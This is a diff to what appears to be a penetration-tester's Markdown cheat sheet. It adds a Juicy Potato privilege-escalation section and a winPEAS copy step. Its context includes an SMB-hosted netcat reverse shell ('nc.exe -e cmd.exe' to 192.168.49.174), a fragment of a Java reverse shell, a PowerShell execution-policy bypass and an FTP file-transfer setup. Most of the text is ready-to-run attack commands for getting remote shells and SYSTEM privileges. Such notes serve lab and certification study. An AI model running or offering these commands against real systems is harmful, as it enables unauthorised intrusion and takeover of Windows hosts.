@@ -381,7 +381,12 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. *On Kali* ```smbserver.py -smb2support Share /home/jon/Downloads```
 > 2. *On Windows ```cmd.exe /c //192.168.49.174/Share/nc.exe -e cmd.exe 192.168.49.174 8082```
 > 3. copy \\192.168.49.174\Share\winPEASx64.exe
+> 4. copy \\192.168.49.174\Share\winPEASx86.exe
 	
+### Juicy Potato
+> 1. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c .\GetCLSID.ps1
+> 1. JuicyPotato.exe -l 10444 -p reverse_shell_msf_venom.exe -t * -c {F2886130-0941-44EB-9335-985BA6EF1ACE}
+
 ##### Download a file in Windows via FTP client 
 > 1. on Kali box first install module of ftp by running: ```pip install pyftpdlib```
 > 1. start FTP server: ```python -m pyftpdlib -p 21```
